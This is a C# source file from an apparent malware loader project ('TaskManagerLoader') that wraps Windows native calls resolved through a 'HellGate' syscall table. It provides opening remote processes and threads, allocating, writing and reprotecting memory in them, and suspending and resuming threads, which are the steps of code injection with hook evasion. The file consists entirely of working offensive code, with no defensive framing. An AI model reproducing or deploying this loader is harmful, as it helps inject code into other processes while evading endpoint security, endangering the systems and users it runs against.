using System;
using System.Runtime.InteropServices;

namespace TaskManagerLoader
{
    public static unsafe class NtSyscalls
    {
        private static VX_TABLE vxTable;
        private static bool initialized = false;

        public static bool Initialize()
        {
            if (initialized)
                return true;

            if (!HellGate.InitializeVxTable(out vxTable))
                return false;

            initialized = true;
            return true;
        }

        private static int ExecuteIndirectSyscall(IntPtr syscallAddress, ushort syscallNum, IntPtr rcx, IntPtr rdx, IntPtr r8, IntPtr r9)
        {
            if (syscallAddress == IntPtr.Zero)
                return -1;

            SyscallDelegate syscallFunc = (SyscallDelegate)Marshal.GetDelegateForFunctionPointer(syscallAddress, typeof(SyscallDelegate));
            
            return syscallFunc(rcx, rdx, r8, r9, syscallNum);
        }
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int SyscallDelegate(IntPtr rcx, IntPtr rdx, IntPtr r8, IntPtr r9, ushort syscallNum);

        public static IntPtr NtOpenProcess(int processId, uint desiredAccess)
        {
            if (!initialized && !Initialize())
                return IntPtr.Zero;

            OBJECT_ATTRIBUTES oa = StealthUtils.InitializeObjectAttributes();
            CLIENT_ID cid = new CLIENT_ID();
            cid.UniqueProcess = new IntPtr(processId);
            cid.UniqueThread = IntPtr.Zero;

            IntPtr hProcess = IntPtr.Zero;
            IntPtr* pHandle = &hProcess;
            OBJECT_ATTRIBUTES* pOa = &oa;
            CLIENT_ID* pCid = &cid;

            IntPtr funcAddr = vxTable.NtOpenProcess.pAddress;
            NtOpenProcessDelegate ntOpenProcess = (NtOpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(NtOpenProcessDelegate));
            int status = ntOpenProcess(pHandle, desiredAccess, pOa, pCid);

            if (status == 0)
                return hProcess;

            return IntPtr.Zero;
        }

        public static IntPtr NtAllocateVirtualMemory(IntPtr hProcess, uint size, uint allocationType, uint protect)
        {
            if (!initialized && !Initialize())
                return IntPtr.Zero;

            IntPtr baseAddress = IntPtr.Zero;
            UIntPtr regionSize = new UIntPtr(size);
            IntPtr* pBaseAddress = &baseAddress;
            UIntPtr* pRegionSize = &regionSize;

            IntPtr funcAddr = vxTable.NtAllocateVirtualMemory.pAddress;
            NtAllocateVirtualMemoryDelegate ntAlloc = (NtAllocateVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(NtAllocateVirtualMemoryDelegate));
            int status = ntAlloc(hProcess, pBaseAddress, IntPtr.Zero, pRegionSize, allocationType, protect);

            if (status == 0)
                return baseAddress;

            return IntPtr.Zero;
        }

        public static bool NtWriteVirtualMemory(IntPtr hProcess, IntPtr baseAddress, byte[] buffer, out uint bytesWritten)
        {
            bytesWritten = 0;
            if (!initialized && !Initialize())
                return false;

            fixed (byte* pBuffer = buffer)
            {
                UIntPtr bytesWrittenPtr = UIntPtr.Zero;
                UIntPtr* pBytesWritten = &bytesWrittenPtr;
                
                IntPtr funcAddr = vxTable.NtWriteVirtualMemory.pAddress;
                NtWriteVirtualMemoryDelegate ntWrite = (NtWriteVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(NtWriteVirtualMemoryDelegate));
                int status = ntWrite(hProcess, baseAddress, (IntPtr)pBuffer, (uint)buffer.Length, pBytesWritten);

                if (status == 0)
                {
                    bytesWritten = (uint)bytesWrittenPtr.ToUInt64();
                    return true;
                }
            }

            return false;
        }

        public static bool NtProtectVirtualMemory(IntPtr hProcess, ref IntPtr baseAddress, uint size, uint newProtect, out uint oldProtect)
        {
            oldProtect = 0;
            if (!initialized && !Initialize())
                return false;

            IntPtr baseAddr = baseAddress;
            UIntPtr regionSize = new UIntPtr(size);
            uint oldProtectValue = 0;

            IntPtr* pBaseAddress = &baseAddr;
            UIntPtr* pRegionSize = &regionSize;
            uint* pOldProtect = &oldProtectValue;

            IntPtr funcAddr = vxTable.NtProtectVirtualMemory.pAddress;
            NtProtectVirtualMemoryDelegate ntProtect = (NtProtectVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(NtProtectVirtualMemoryDelegate));
            int status = ntProtect(hProcess, pBaseAddress, pRegionSize, newProtect, pOldProtect);

            if (status == 0)
            {
                baseAddress = baseAddr;
                oldProtect = oldProtectValue;
                return true;
            }

            return false;
        }

        public static IntPtr NtOpenThread(int threadId, uint desiredAccess)
        {
            if (!initialized && !Initialize())
                return IntPtr.Zero;

            OBJECT_ATTRIBUTES oa = StealthUtils.InitializeObjectAttributes();
            CLIENT_ID cid = new CLIENT_ID();
            cid.UniqueProcess = IntPtr.Zero;
            cid.UniqueThread = new IntPtr(threadId);

            IntPtr hThread = IntPtr.Zero;
            IntPtr* pHandle = &hThread;
            OBJECT_ATTRIBUTES* pOa = &oa;
            CLIENT_ID* pCid = &cid;

            IntPtr funcAddr = vxTable.NtOpenThread.pAddress;
            NtOpenThreadDelegate ntOpenThread = (NtOpenThreadDelegate)Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(NtOpenThreadDelegate));
            int status = ntOpenThread(pHandle, desiredAccess, pOa, pCid);

            if (status == 0)
                return hThread;

            return IntPtr.Zero;
        }

        public static uint NtSuspendThread(IntPtr hThread)
        {
            if (!initialized && !Initialize())
                return 0xFFFFFFFF;

            uint suspendCount = 0;
            uint* pSuspendCount = &suspendCount;

            IntPtr funcAddr = vxTable.NtSuspendThread.pAddress;
            NtSuspendThreadDelegate ntSuspend = (NtSuspendThreadDelegate)Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(NtSuspendThreadDelegate));
            int status = ntSuspend(hThread, pSuspendCount);

            if (status == 0)
                return suspendCount;

            return 0xFFFFFFFF;
        }

        public static uint NtResumeThread(IntPtr hThread)
        {
            if (!initialized && !Initialize())
                return 0xFFFFFFFF;

            uint suspendCount = 0;
            uint* pSuspendCount = &suspendCount;

            IntPtr funcAddr = vxTable.NtResumeThread.pAddress;
            NtResumeThreadDelegate ntResume = (NtResumeThreadDelegate)Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(NtResumeThreadDelegate));
            int status = ntResume(hThread, pSuspendCount);

            if (status == 0)
                return suspendCount;

            return 0xFFFFFFFF;
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtOpenProcessDelegate(IntPtr* ProcessHandle, uint DesiredAccess, OBJECT_ATTRIBUTES* ObjectAttributes, CLIENT_ID* ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, IntPtr* BaseAddress, IntPtr ZeroBits, UIntPtr* RegionSize, uint AllocationType, uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtWriteVirtualMemoryDelegate(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint BufferLength, UIntPtr* NumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, IntPtr* BaseAddress, UIntPtr* RegionSize, uint NewProtect, uint* OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtOpenThreadDelegate(IntPtr* ThreadHandle, uint DesiredAccess, OBJECT_ATTRIBUTES* ObjectAttributes, CLIENT_ID* ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtSuspendThreadDelegate(IntPtr ThreadHandle, uint* PreviousSuspendCount);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtResumeThreadDelegate(IntPtr ThreadHandle, uint* PreviousSuspendCount);

        [DllImport("ntdll.dll")]
        public static extern int NtClose(IntPtr Handle);
    }
}
